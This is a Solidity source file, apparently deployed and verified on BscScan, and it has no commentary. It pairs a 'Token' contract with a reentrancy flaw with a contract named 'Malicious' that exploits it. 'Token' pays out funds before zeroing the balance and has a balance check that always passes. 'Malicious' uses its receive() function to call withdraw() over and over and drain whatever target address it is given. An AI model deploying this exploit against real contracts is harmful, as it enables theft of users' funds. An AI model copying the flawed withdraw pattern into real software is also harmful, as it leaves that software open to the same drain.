/**
 *Submitted for verification at BscScan.com on 2022-03-18
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Token {
    address public minter;
    mapping (address => uint256) public balances;

    constructor() {
        minter = msg.sender;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(address payable to_) external {
        require(balances[msg.sender] >= 0, "Not enough money");
        (bool sent, ) = to_.call{value:balances[msg.sender]}("");
        require(sent, "There are troubles in withdraw");
        balances[msg.sender] = 0;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Malicious {
    Token public token;
    
    constructor(address payable _target){
        token = Token(_target);
    }
    
    receive() external payable {
        //if (address(token).balance >= 1) {
        token.withdraw(payable(address(this)));
        //}
        //address(this).balance += msg.value;
    }

    function run() external payable {
        require(msg.value >= 1);
        token.deposit{value: msg.value}();
        token.withdraw(payable(address(this)));
    }

    function depositToken() external payable {
        token.deposit{value: msg.value}();
    }

    function withdrawToken() external {
        token.withdraw(payable(address(this)));
    }
}